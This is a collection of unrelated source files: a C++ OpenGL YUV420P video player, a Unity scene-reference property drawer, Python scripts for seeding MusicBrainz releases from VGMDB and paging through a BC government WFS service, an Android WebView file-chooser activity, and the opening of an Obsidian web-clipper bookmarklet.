 glfwSetWindowShouldClose(win, GL_TRUE);
 break;
    }
  };
}


void frame_callback(AVFrame* frame, AVPacket* pkt, void* user) {


 if(!playback_initialized) {
 initialize_playback(frame, pkt);
    playback_initialized = true;
  }


 if(player_ptr) {
    player_ptr->setYPixels(frame->data[0], frame->linesize[0]);
    player_ptr->setUPixels(frame->data[1], frame->linesize[1]);
    player_ptr->setVPixels(frame->data[2], frame->linesize[2]);
  }
}


void initialize_playback(AVFrame* frame, AVPacket* pkt) {


 if(frame->format != AV_PIX_FMT_YUV420P) {
 printf(""This code only support YUV420P data.\n"");
 ::exit(EXIT_FAILURE);
  }


 if(!player_ptr) {
 printf(""player_ptr not found.\n"");
 ::exit(EXIT_FAILURE);
  }


 if(!player_ptr->setup(frame->width, frame->height)) {
 printf(""Cannot setup the yuv420 player.\n"");
 ::exit(EXIT_FAILURE);
  }
}


void error_callback(int err, const char* desc) {
 printf(""GLFW error: %s (%d)\n"", desc, err);
}


void resize_callback(GLFWwindow* window, int width, int height) { 


 if(player_ptr) {
    player_ptr->resize(width, height);
  }
}


void button_callback(GLFWwindow* win, int bt, int action, int mods) {
 double x,y;
 if(action == GLFW_PRESS || action == GLFW_REPEAT) { 
 glfwGetCursorPos(win, &x, &y);
  }
}


void cursor_callback(GLFWwindow* win, double x, double y) { }


void char_callback(GLFWwindow* win, unsigned int key) { }
#include ""YUV420P_Player.h""


YUV420P_Player::YUV420P_Player()
  :vid_w(0)
  ,vid_h(0)
  ,win_w(0)
  ,win_h(0)
  ,vao(0)
  ,y_tex(0)
  ,u_tex(0)
  ,v_tex(0)
  ,vert(0)
  ,frag(0)
  ,prog(0)
  ,u_pos(-1)
  ,textures_created(false)
  ,shader_created(false)
  ,y_pixels(NULL)
  ,u_pixels(NULL)
  ,v_pixels(NULL)
{
}


bool YUV420P_Player::setup(int vidW, int vidH) {


  vid_w = vidW;
  vid_h = vidH;


 if(!vid_w || !vid_h) {
 printf(""Invalid texture size.\n"");
 return false;
  }


 if(y_pixels || u_pixels || v_pixels) {
 printf(""Already setup the YUV420P_Player.\n"");
 return false;
  }


  y_pixels = new uint8_t[vid_w * vid_h];
  u_pixels = new uint8_t[int((vid_w * 0.5) * (vid_h * 0.5))];
  v_pixels = new uint8_t[int((vid_w * 0.5) * (vid_h * 0.5))];


 if(!setupTextures()) {
 return false;
  }


 if(!setupShader()) {
 return false;
  }


 glGenVertexArrays(1, &vao);


 return true;
}


bool YUV420P_Player::setupShader() {
 
 if(shader_created) {
 printf(""Already creatd the shader.\n"");
 return false;
  }


  vert = rx_create_shader(GL_VERTEX_SHADER, YUV420P_VS);
  frag = rx_create_shader(GL_FRAGMENT_SHADER, YUV420P_FS);
  prog = rx_create_program(vert, frag);


 glLinkProgram(prog);
 rx_print_shader_link_info(prog);


 glUseProgram(prog);
 glUniform1i(glGetUniformLocation(prog, ""y_tex""), 0);
 glUniform1i(glGetUniformLocation(prog, ""u_tex""), 1);
 glUniform1i(glGetUniformLocation(prog, ""v_tex""), 2);


  u_pos = glGetUniformLocation(prog, ""draw_pos"");


  GLint viewport[4];
 glGetIntegerv(GL_VIEWPORT, viewport);
 resize(viewport[2], viewport[3]);


 return true;
}


bool YUV420P_Player::setupTextures() {


 if(textures_created) {
 printf(""Textures already created.\n"");
 return false;
  }


 glGenTextures(1, &y_tex);
 glBindTexture(GL_TEXTURE_2D, y_tex);
 glTexImage2D(GL_TEXTURE_2D, 0, GL_R8, vid_w, vid_h, 0, GL_RED, GL_UNSIGNED_BYTE, NULL); // y_pixels);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);


 glGenTextures(1, &u_tex);
 glBindTexture(GL_TEXTURE_2D, u_tex);
 glTexImage2D(GL_TEXTURE_2D, 0, GL_R8, vid_w/2, vid_h/2, 0, GL_RED, GL_UNSIGNED_BYTE, NULL);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
 
 glGenTextures(1, &v_tex);
 glBindTexture(GL_TEXTURE_2D, v_tex);
 glTexImage2D(GL_TEXTURE_2D, 0, GL_R8, vid_w/2, vid_h/2, 0, GL_RED, GL_UNSIGNED_BYTE, NULL);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);


  textures_created = true;
 return true;
}


void YUV420P_Player::draw(int x, int y, int w, int h) {
 assert(textures_created == true);


 if(w == 0) {
    w = vid_w;
  }


 if(h == 0) {
    h = vid_h;
  }
 
 glBindVertexArray(vao);
 glUseProgram(prog);


 glUniform4f(u_pos, x, y, w, h);


 glActiveTexture(GL_TEXTURE0);
 glBindTexture(GL_TEXTURE_2D, y_tex);


 glActiveTexture(GL_TEXTURE1);
 glBindTexture(GL_TEXTURE_2D, u_tex);


 glActiveTexture(GL_TEXTURE2);
 glBindTexture(GL_TEXTURE_2D, v_tex);


 glDrawArrays(GL_TRIANGLE_STRIP, 0, 4);
}


void YUV420P_Player::resize(int winW, int winH) {
 assert(winW > 0 && winH > 0);


  win_w = winW;
  win_h = winH;


  pm.identity();
  pm.ortho(0, win_w, win_h, 0, 0.0, 100.0f);


 glUseProgram(prog);
 glUniformMatrix4fv(glGetUniformLocation(prog, ""u_pm""), 1, GL_FALSE, pm.ptr());
}


void YUV420P_Player::setYPixels(uint8_t* pixels, int stride) {
 assert(textures_created == true);


 glBindTexture(GL_TEXTURE_2D, y_tex);
 glPixelStorei(GL_UNPACK_ROW_LENGTH, stride);
 glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, vid_w, vid_h, GL_RED, GL_UNSIGNED_BYTE, pixels);
}


void YUV420P_Player::setUPixels(uint8_t* pixels, int stride) {
 assert(textures_created == true);


 glBindTexture(GL_TEXTURE_2D, u_tex);
 glPixelStorei(GL_UNPACK_ROW_LENGTH, stride);
 glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, vid_w/2, vid_h/2, GL_RED, GL_UNSIGNED_BYTE, pixels);
}


void YUV420P_Player::setVPixels(uint8_t* pixels, int stride) {
 assert(textures_created == true);


 glBindTexture(GL_TEXTURE_2D, v_tex);
 glPixelStorei(GL_UNPACK_ROW_LENGTH, stride);
 glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, vid_w/2, vid_h/2, GL_RED, GL_UNSIGNED_BYTE, pixels);
}
/*
 
  YUV420P Player
  --------------

  This class implements a simple YUV420P renderer. This means that you 
  need to feed planar YUV420 data to the `setYPixels()`, `setUPixels()`
  and `setVPixels()`. 

  First make sure to call setup() with the video width and height. We use
  these dimensions to allocate the Y, U and V textures. After calling setup
  you call the zset{Y,U,V}Pixels()` everytime you have a new frame that
  you want to render. With the `draw()` function you draw the current 
  frame to the screen.

  If you resize your viewport, make sure to  call `resize()` so we can 
  adjust the projection matrix.

 */
#ifndef ROXLU_YUV420P_PLAYER_H
#define ROXLU_YUV420P_PLAYER_H


#define ROXLU_USE_MATH
#define ROXLU_USE_PNG
#define ROXLU_USE_OPENGL
#include <tinylib.h>
#include <stdint.h>


static const char* YUV420P_VS = """" 
 ""#version 330\n""
 """"
 ""uniform mat4 u_pm;""
 ""uniform vec4 draw_pos;""
 """"
 ""const vec2 verts[4] = vec2[] (""
 ""  vec2(-0.5,  0.5), ""
 ""  vec2(-0.5, -0.5), ""
 ""  vec2( 0.5,  0.5), ""
 ""  vec2( 0.5, -0.5)  ""
 "");""
 """"
 ""const vec2 texcoords[4] = vec2[] (""
 ""  vec2(0.0, 1.0), ""
 ""  vec2(0.0, 0.0), ""
 ""  vec2(1.0, 1.0), ""
 ""  vec2(1.0, 0.0)  ""
 ""); ""
 """"
 ""out vec2 v_coord; ""
 """"
 ""void main() {""
 ""   vec2 vert = verts[gl_VertexID];""
 ""   vec4 p = vec4((0.5 * draw_pos.z) + draw_pos.x + (vert.x * draw_pos.z), ""
 ""                 (0.5 * draw_pos.w) + draw_pos.y + (vert.y * draw_pos.w), ""
 ""                 0, 1);""
 ""   gl_Position = u_pm * p;""
 ""   v_coord = texcoords[gl_VertexID];"" 
 ""}""
 """";


static const char* YUV420P_FS = """"
 ""#version 330\n""
 ""uniform sampler2D y_tex;""
 ""uniform sampler2D u_tex;""
 ""uniform sampler2D v_tex;""
 ""in vec2 v_coord;""
 ""layout( location = 0 ) out vec4 fragcolor;""
 """"
 ""const vec3 R_cf = vec3(1.164383,  0.000000,  1.596027);""
 ""const vec3 G_cf = vec3(1.164383, -0.391762, -0.812968);""
 ""const vec3 B_cf = vec3(1.164383,  2.017232,  0.000000);""
 ""const vec3 offset = vec3(-0.0625, -0.5, -0.5);""
 """"
 ""void main() {""
 ""  float y = texture(y_tex, v_coord).r;""
 ""  float u = texture(u_tex, v_coord).r;""
 ""  float v = texture(v_tex, v_coord).r;""
 ""  vec3 yuv = vec3(y,u,v);""
 ""  yuv += offset;""
 ""  fragcolor = vec4(0.0, 0.0, 0.0, 1.0);""
 ""  fragcolor.r = dot(yuv, R_cf);""
 ""  fragcolor.g = dot(yuv, G_cf);""
 ""  fragcolor.b = dot(yuv, B_cf);""
 ""}""
 """";


class YUV420P_Player {


 public:
 YUV420P_Player();
 bool setup(int w, int h);
 void setYPixels(uint8_t* pixels, int stride);
 void setUPixels(uint8_t* pixels, int stride);
 void setVPixels(uint8_t* pixels, int stride);
 void draw(int x, int y, int w = 0, int h = 0);
 void resize(int winW, int winH);


 private:
 bool setupTextures();
 bool setupShader();
 
 public:
 int vid_w;
 int vid_h;
 int win_w;
 int win_h;
  GLuint vao;
  GLuint y_tex;
  GLuint u_tex;
  GLuint v_tex;
  GLuint vert;
  GLuint frag;
  GLuint prog;
  GLint u_pos;
 bool textures_created;
 bool shader_created;
 uint8_t* y_pixels;
 uint8_t* u_pixels;
 uint8_t* v_pixels;
  mat4 pm;
};
#endif
"
"SceneObject.cs
","using UnityEngine;
#if UNITY_EDITOR
using UnityEditor;
#endif


[System.Serializable]
public class SceneObject
{
 [SerializeField]
 private string m_SceneName;


 public static implicit operator string(SceneObject sceneObject)
 {
 return sceneObject.m_SceneName;
 }


 public static implicit operator SceneObject(string sceneName)
 {
 return new SceneObject() { m_SceneName = sceneName };
 }
}


#if UNITY_EDITOR
[CustomPropertyDrawer(typeof(SceneObject))]
public class SceneObjectEditor : PropertyDrawer
{
 protected SceneAsset GetSceneObject(string sceneObjectName)
 {
 if (string.IsNullOrEmpty(sceneObjectName))
 return null;


 for (int i = 0; i < EditorBuildSettings.scenes.Length; i++)
 {
 EditorBuildSettingsScene scene = EditorBuildSettings.scenes[i];
 if (scene.path.IndexOf(sceneObjectName) != -1)
 {
 return AssetDatabase.LoadAssetAtPath(scene.path, typeof(SceneAsset)) as SceneAsset;
 }
 }


		Debug.Log(""Scene ["" + sceneObjectName + ""] cannot be used. Add this scene to the 'Scenes in the Build' in the build settings."");
 return null;
 }


 public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)
 {
 var sceneObj = GetSceneObject(property.FindPropertyRelative(""m_SceneName"").stringValue);
 var newScene = EditorGUI.ObjectField(position, label, sceneObj, typeof(SceneAsset), false);
 if (newScene == null)
 {
 var prop = property.FindPropertyRelative(""m_SceneName"");
			prop.stringValue = """";
 }
 else
 {
 if (newScene.name != property.FindPropertyRelative(""m_SceneName"").stringValue)
 {
 var scnObj = GetSceneObject(newScene.name);
 if (scnObj == null)
 {
					Debug.LogWarning(""The scene "" + newScene.name + "" cannot be used. To use this scene add it to the build settings for the project."");
 }
 else
 {
 var prop = property.FindPropertyRelative(""m_SceneName"");
					prop.stringValue = newScene.name;
 }
 }
 }
 }
}
#endif
==<SEPERATOR>==
vgmdb2mb.py
#!/usr/bin/python
# coding=utf-8


""""""Python Script for bootstrapping a MusicBrainz release using a VGMDB album.

This script uses the unofficial VGMDB.info JSON API to prefill the MusicBrainz
""Add Release"" form with data from VGMDB.

It is only meant as a first step to make adding a new MB release easier; please
check for missing/erroneous data and make sure the imported release follows the
MusicBrainz guidelines!

Because VGMDB has a lot of Japanese content, we import track/release titles from
this language before trying other languages, and try to guess values for some
fields (e.g. ""Soundtrack"" album types).

Documentation about the field format is found at:
    https://musicbrainz.org/doc/Development/Release_Editor_Seeding
""""""


import re
import sys
import json
import html
import argparse
import webbrowser
from urllib.request import urlopen
from tempfile import NamedTemporaryFile
from datetime import datetime




def strptimes(s, fmts):
 for fmt in fmts:
 try:
 return datetime.strptime(s, fmt)
 except ValueError:
 continue
 return None




def vgmdb_get_album_url(album_id, format_=""json""):
 """"""Return the VGMDB API URL for the given album ID""""""
 return ""https://vgmdb.info/album/%d?format=%s"" % (album_id, format_)




def vgmdb_get_album_data(album_url):
 """"""Retrieve data for a VGMDB album""""""
 return json.load(urlopen(album_url))




def write_musicbrainz_html_form(fd, album_data):
 """"""Write a local MusicBrainz import form containing album data""""""


 fd.write(""""""<!doctype html>"""""")
 fd.write(""""""<meta charset=""UTF-8"">"""""")
 fd.write(""""""<title>Add VGMDB album As Release...</title>"""""")
 fd.write(""""""<form action=""https://musicbrainz.org/release/add"" method=""post"">"""""")


 album_title = album_data['names'].get('ja')
 album_title = album_title or next(iter(album_data[""names""].values()))
 fd.write(f""""""<input type=""hidden"" name=""name"" value=""{html.escape(album_title)}"">"""""")


 fd.write(f""""""<input type=""hidden"" name=""status"" value=""official"">"""""")


 if ""soundtrack"" in album_data[""classification""].lower():
 fd.write(f""""""<input type=""hidden"" name=""type"" value=""album"">"""""")
 fd.write(f""""""<input type=""hidden"" name=""type"" value=""soundtrack"">"""""")


 if ""ja"" in album_data['names'].keys():
 fd.write(f""""""<input type=""hidden"" name=""language"" value=""jpn"">"""""")
 fd.write(f""""""<input type=""hidden"" name=""script"" value=""Jpan"">"""""")


 all_artists = []
 composers = []
 arrangers = []
 performers = []
 lyricists = []
 for composer_data in album_data[""composers""]:
 composer_name = composer_data[""names""].get(""ja"")
 composer_name = composer_name or next(iter(composer_data[""names""].values()))
 if composer_name not in all_artists:
 all_artists.append(composer_name)
 if composer_name not in composers:
 composers.append(composer_name)
 for arranger_data in album_data[""arrangers""]:
 arranger_name = arranger_data[""names""].get(""ja"")
 arranger_name = arranger_name or next(iter(arranger_data[""names""].values()))
 if arranger_name not in all_artists:
 all_artists.append(arranger_name)
 if arranger_name not in arrangers:
 arrangers.append(arranger_name)
 for performer_data in album_data[""performers""]:
 performer_name = performer_data[""names""].get(""ja"")
 performer_name = performer_name or next(iter(performer_data[""names""].values()))
 if performer_name not in all_artists:
 all_artists.append(performer_name)
 if performer_name not in performers:
 performers.append(performer_name)
 for lyricist_data in album_data[""lyricists""]:
 lyricist_name = lyricist_data[""names""].get(""ja"")
 lyricist_name = lyricist_name or next(iter(lyricist_data[""names""].values()))
 if lyricist_name not in all_artists:
 all_artists.append(lyricist_name)
 if lyricist_name not in lyricists:
 lyricists.append(lyricist_name)


 artists = [""Various Artists""] if len(performers) >= 3 else all_artists
 track_artists = performers or arrangers or composers or lyricists or all_artists


 join_phrase = "", ""
 for artist_ix, artist_name in enumerate(artists):
 fd.write(f""""""<input type=""hidden"" name=""artist_credit.names.{artist_ix}.artist.name"" value=""{html.escape(artist_name)}"">"""""")
 if artist_ix < len(artists)-1:
 fd.write(f""""""<input type=""hidden"" name=""artist_credit.names.{artist_ix}.join_phrase"" value=""{html.escape(join_phrase)}"">"""""")


 release_date = strptimes(album_data['release_date'], [""%Y-%m-%d"", ""%Y""])
 if release_date:
 fd.write(f""""""<input type=""hidden"" name=""events.0.date.year"" value=""{release_date.year}"">"""""")
 fd.write(f""""""<input type=""hidden"" name=""events.0.date.month"" value=""{release_date.month}"">"""""")
 fd.write(f""""""<input type=""hidden"" name=""events.0.date.day"" value=""{release_date.day}"">"""""")


 if ""ja"" in album_data['names'].keys():
 fd.write(f""""""<input type=""hidden"" name=""events.0.country"" value=""JP"">"""""")


 catalog_nr = album_data['catalog']
 fd.write(f""""""<input type=""hidden"" name=""labels.0.catalog_number"" value=""{html.escape(catalog_nr)}"">"""""")


 vgmdb_link = album_data['vgmdb_link']
 fd.write(f""""""<input type=""hidden"" name=""urls.0.url"" value=""{html.escape(vgmdb_link)}"">"""""")
 fd.write(f""""""<input type=""hidden"" name=""urls.0.link_type"" value=""86"">"""""")  # VGMDB
 fd.write(f""""""<input type=""hidden"" name=""edit_note"" value=""Imported from {html.escape(vgmdb_link)}"">"""""")


 for disc_ix, disc_data in enumerate(album_data[""discs""]):
 if album_data[""media_format""] == ""CD"":
 fd.write(f""""""<input type=""hidden"" name=""mediums.{disc_ix}.format"" value=""CD"">"""""")
 for track_ix, track_data in enumerate(disc_data[""tracks""]):
 track_title = track_data[""names""].get(""Japanese"")
 track_title = track_title or next(iter(track_data[""names""].values()))
 if track_data[""track_length""] and track_data[""track_length""].lower() != ""unknown"":
 track_length = datetime.strptime(track_data[""track_length""], ""%M:%S"")
 track_length = 1000 * (track_length.minute*60 + track_length.second)
 else:
 track_length = 0
 fd.write(f""""""<input type=""hidden"" name=""mediums.{disc_ix}.track.{track_ix}.name"" value=""{html.escape(track_title)}"">"""""")
 fd.write(f""""""<input type=""hidden"" name=""mediums.{disc_ix}.track.{track_ix}.length"" value=""{track_length}"">"""""")
 for artist_ix, artist_name in enumerate(track_artists):
 fd.write(f""""""<input type=""hidden"" name=""mediums.{disc_ix}.track.{track_ix}.artist_credit.names.{artist_ix}.mbid"" value="""">"""""")
 fd.write(f""""""<input type=""hidden"" name=""mediums.{disc_ix}.track.{track_ix}.artist_credit.names.{artist_ix}.name"" value=""{html.escape(artist_name)}"">"""""")
 fd.write(f""""""<input type=""hidden"" name=""mediums.{disc_ix}.track.{track_ix}.artist_credit.names.{artist_ix}.artist.name"" value=""{html.escape(artist_name)}"">"""""")
 fd.write(f""""""<input type=""hidden"" name=""mediums.{disc_ix}.track.{track_ix}.artist_credit.names.{artist_ix}.join_phrase"" value="", "">"""""")


 fd.write(""""""<input type=""submit"" value=""Add Cluster As Release..."">"""""")
 fd.write(""""""</form>"""""")
 fd.write(""""""<script>document.forms[0].submit()</script>"""""")




# Parse arguments
parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument(""album_id_url"", help=""VGMDB album id or URL"", type=str)
parser.add_argument(""--show-api-page"", ""-s"", help=""Show API page instead of the MB form"", action=""store_true"")
args = parser.parse_args()


# Parse album ID
album_id = None
m = re.match(r""(https?://)?vgmdb.net/album/(?P<album_id>\d+).*"", args.album_id_url)
if m:
 album_id = int(m.group(""album_id""))
elif args.album_id_url.isdigit():
 album_id = int(args.album_id_url)
else:
 print(""Invalid album ID or URL"")
 sys.exit(1)


# Retrieve album URL
if args.show_api_page:
 album_url = vgmdb_get_album_url(album_id, format_=""html"")
 print(""Opening %s"" % album_url)
 webbrowser.open(album_url)
 sys.exit(0)


# Retrieve album data, write and open MusicBrainz form
album_url = vgmdb_get_album_url(album_id)
album_data = vgmdb_get_album_data(album_url)
with NamedTemporaryFile(suffix="".html"", encoding=""utf-8"", mode=""w+"", delete=False) as fd:
 write_musicbrainz_html_form(fd, album_data)
 print(""Opening %s"" % fd.name)
 webbrowser.open(fd.name)
"
"pagination.py
","import requests


# wfs_url = ""https://openmaps.gov.bc.ca/geo/pub/ows?""
# f = 'WHSE_WATER_MANAGEMENT.GW_WATER_WELLS_WRBC_SVW'


def get_data(wfs_url, dataset):
 pagesize =10000 
 r = wfs_query(f)
 matched = int(r.get('numberMatched'))
 returned = int(r.get('numberReturned'))
 features = (r.get('features'))
 while returned < matched:
 start_index = returned
 r = wfs_query(f,start_index=start_index,count=pagesize)
 returned += int(r.get('numberReturned'))
 features = features + r.get('features')
 return features 


def wfs_query(dataset, start_index = None, count=None, query=None, fields=None): 
 '''Returns dataset in json format limited by query and fields'''
 url = ""https://openmaps.gov.bc.ca/geo/pub/ows?""
 params = {'service':'WFS',
 'version': '2.0.0',
 'request': 'GetFeature',
 'typeName': f'pub:{dataset}',
 'outputFormat':'json',
        }
 # if query:
 #     params['CQL_FILTER']=query + bb + "")"".replace("", "", "","")
 if fields:
 params['propertyName']=fields.replace("", "", "","").upper()
 if start_index:
 params['startIndex'] = start_index
 params['sortBy']='OBJECTID'
 if count:
 params['count'] = count
 r = requests.get(url, params)
 #print(r.url) # for testing - delete
 return r.json()
==<SEPERATOR>==
MainActivity.java
/*
reference link ->https://www.opengeeks.me/2015/08/filechooser-and-android-webview/
https://github.com/OpenGeeksMe/Android-File-Chooser
*/


import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcelable;
import android.provider.MediaStore;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
public class MainActivity extends ActionBarActivity {
 private static final int INPUT_FILE_REQUEST_CODE = 1;
 private static final int FILECHOOSER_RESULTCODE = 1;
 private static final String TAG = MainActivity.class.getSimpleName();
 private WebView webView;
 private WebSettings webSettings;
 private ValueCallback<Uri> mUploadMessage;
 private Uri mCapturedImageURI = null;
 private ValueCallback<Uri[]> mFilePathCallback;
 private String mCameraPhotoPath;
 @Override
 public void onActivityResult(int requestCode, int resultCode, Intent data) {
 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
 if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
 super.onActivityResult(requestCode, resultCode, data);
 return;
            }
 Uri[] results = null;
 // Check that the response is a good one
 if (resultCode == Activity.RESULT_OK) {
 if (data == null) {
 // If there is not data, then we may have taken a photo
 if (mCameraPhotoPath != null) {
 results = new Uri[]{Uri.parse(mCameraPhotoPath)};
                    }
                } else {
 String dataString = data.getDataString();
 if (dataString != null) {
 results = new Uri[]{Uri.parse(dataString)};
                    }
                }
            }
 mFilePathCallback.onReceiveValue(results);
 mFilePathCallback = null;
        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
 if (requestCode != FILECHOOSER_RESULTCODE || mUploadMessage == null) {
 super.onActivityResult(requestCode, resultCode, data);
 return;
            }
 if (requestCode == FILECHOOSER_RESULTCODE) {
 if (null == this.mUploadMessage) {
 return;
                }
 Uri result = null;
 try {
 if (resultCode != RESULT_OK) {
 result = null;
                    } else {
 // retrieve from the private variable if the intent is null
 result = data == null ? mCapturedImageURI : data.getData();
                    }
                } catch (Exception e) {
 Toast.makeText(getApplicationContext(), ""activity :"" + e,
 Toast.LENGTH_LONG).show();
                }
 mUploadMessage.onReceiveValue(result);
 mUploadMessage = null;
            }
        }
 return;
    }
 @Override
 protected void onCreate(Bundle savedInstanceState) {
 super.onCreate(savedInstanceState);
 setContentView(R.layout.activity_main);
 webView = (WebView) findViewById(R.id.webview);
 webSettings = webView.getSettings();
 webSettings.setJavaScriptEnabled(true);
 webSettings.setLoadWithOverviewMode(true);
 webSettings.setAllowFileAccess(true);
 webView.setWebViewClient(new Client());
 webView.setWebChromeClient(new ChromeClient());
 if (Build.VERSION.SDK_INT >= 19) {
 webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        }
 else if(Build.VERSION.SDK_INT >=11 && Build.VERSION.SDK_INT < 19) {
 webView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
        }
 webView.loadUrl(""http://example.com""); //change with your website
    }
 private File createImageFile() throws IOException {
 // Create an image file name
 String timeStamp = new SimpleDateFormat(""yyyyMMdd_HHmmss"").format(new Date());
 String imageFileName = ""JPEG_"" + timeStamp + ""_"";
 File storageDir = Environment.getExternalStoragePublicDirectory(
 Environment.DIRECTORY_PICTURES);
 File imageFile = File.createTempFile(
 imageFileName,  /* prefix */
 "".jpg"",         /* suffix */
 storageDir /* directory */
        );
 return imageFile;
    }
 public class ChromeClient extends WebChromeClient {
 // For Android 5.0
 public boolean onShowFileChooser(WebView view, ValueCallback<Uri[]> filePath, WebChromeClient.FileChooserParams fileChooserParams) {
 // Double check that we don't have any existing callbacks
 if (mFilePathCallback != null) {
 mFilePathCallback.onReceiveValue(null);
            }
 mFilePathCallback = filePath;
 Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
 if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
 // Create the File where the photo should go
 File photoFile = null;
 try {
 photoFile = createImageFile();
 takePictureIntent.putExtra(""PhotoPath"", mCameraPhotoPath);
                } catch (IOException ex) {
 // Error occurred while creating the File
 Log.e(TAG, ""Unable to create Image File"", ex);
                }
 // Continue only if the File was successfully created
 if (photoFile != null) {
 mCameraPhotoPath = ""file:"" + photoFile.getAbsolutePath();
 takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,
 Uri.fromFile(photoFile));
                } else {
 takePictureIntent = null;
                }
            }
 Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
 contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
 contentSelectionIntent.setType(""image/*"");
 Intent[] intentArray;
 if (takePictureIntent != null) {
 intentArray = new Intent[]{takePictureIntent};
            } else {
 intentArray = new Intent[0];
            }
 Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
 chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
 chooserIntent.putExtra(Intent.EXTRA_TITLE, ""Image Chooser"");
 chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
 startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE);
 return true;
        }
 // openFileChooser for Android 3.0+
 public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
 mUploadMessage = uploadMsg;
 // Create AndroidExampleFolder at sdcard
 // Create AndroidExampleFolder at sdcard
 File imageStorageDir = new File(
 Environment.getExternalStoragePublicDirectory(
 Environment.DIRECTORY_PICTURES)
                    , ""AndroidExampleFolder"");
 if (!imageStorageDir.exists()) {
 // Create AndroidExampleFolder at sdcard
 imageStorageDir.mkdirs();
            }
 // Create camera captured image file path and name
 File file = new File(
 imageStorageDir + File.separator + ""IMG_""
                            + String.valueOf(System.currentTimeMillis())
                            + "".jpg"");
 mCapturedImageURI = Uri.fromFile(file);
 // Camera capture image intent
 final Intent captureIntent = new Intent(
 android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
 captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI);
 Intent i = new Intent(Intent.ACTION_GET_CONTENT);
 i.addCategory(Intent.CATEGORY_OPENABLE);
 i.setType(""image/*"");
 // Create file chooser intent
 Intent chooserIntent = Intent.createChooser(i, ""Image Chooser"");
 // Set camera intent to file chooser
 chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS
                    , new Parcelable[] { captureIntent });
 // On select image call onActivityResult method of activity
 startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE);
        }
 // openFileChooser for Android < 3.0
 public void openFileChooser(ValueCallback<Uri> uploadMsg) {
 openFileChooser(uploadMsg, """");
        }
 //openFileChooser for other Android versions
 public void openFileChooser(ValueCallback<Uri> uploadMsg,
 String acceptType,
 String capture) {
 openFileChooser(uploadMsg, acceptType);
        }
    }
 public boolean onKeyDown(int keyCode, KeyEvent event) {
 // Check if the key event was the Back button and if there's history
 if ((keyCode == KeyEvent.KEYCODE_BACK) && webView.canGoBack()) {
 webView.goBack();
 return true;
        }
 // If it wasn't the Back key or there's no web page history, bubble up to the default
 // system behavior (probably exit the activity)
 return super.onKeyDown(keyCode, event);
    }
 public class Client extends WebViewClient {
 ProgressDialog progressDialog;
 public boolean shouldOverrideUrlLoading(WebView view, String url) {
 // If url contains mailto link then open Mail Intent
 if (url.contains(""mailto:"")) {
 // Could be cleverer and use a regex
 //Open links in new browser
 view.getContext().startActivity(
 new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
 // Here we can open new activity
 return true;
            }else {
 // Stay within this webview and load url
 view.loadUrl(url);
 return true;
            }
        }
 //Show loader on url load
 public void onPageStarted(WebView view, String url, Bitmap favicon) {
 // Then show progress  Dialog
 // in standard case YourActivity.this
 if (progressDialog == null) {
 progressDialog = new ProgressDialog(MainActivity.this);
 progressDialog.setMessage(""Loading..."");
 progressDialog.show();
            }
        }
 // Called when all page resources loaded
 public void onPageFinished(WebView view, String url) {
 try {
 // Close progressDialog
 if (progressDialog.isShowing()) {
 progressDialog.dismiss();
 progressDialog = null;
                }
            } catch (Exception exception) {
 exception.printStackTrace();
            }
        }
    }
}
==<SEPERATOR>==
obsidian-web-clipper.js
javascript: Promise.all([import('https://unpkg.com/turndown@6.0.0?module'), import('https://unpkg.com/@tehshrike/readability@0.2.0'), ]).then(async ([{
 default: Turndown
}, {
 default: Readability
}]) => {


 /* Optional vault name */
 const vault = """";


 /* Optional folder name such as ""Clippings/"" */
 const folder = ""Clippings/"";


 /* Optional tags  */
 let tags = ""clippings"";


 /* Parse the site's meta keywords content into tags, if present */
 if (document.querySelector('meta[name=""keywords"" i]')) {
 var keywords = document.querySelector('meta[name=""keywords"" i]').getAttribute('content').split(',');


 keywords.forEach(function(keyword) {
 let tag = ' ' + keyword.split(' ').join('');
 tags += tag;
 });
 }


 function getSelectionHtml() {
 var html = """";
 if (typeof window.getSelection != ""undefined"") {
 var sel = window.getSelection();
 if (sel.rangeCount) {
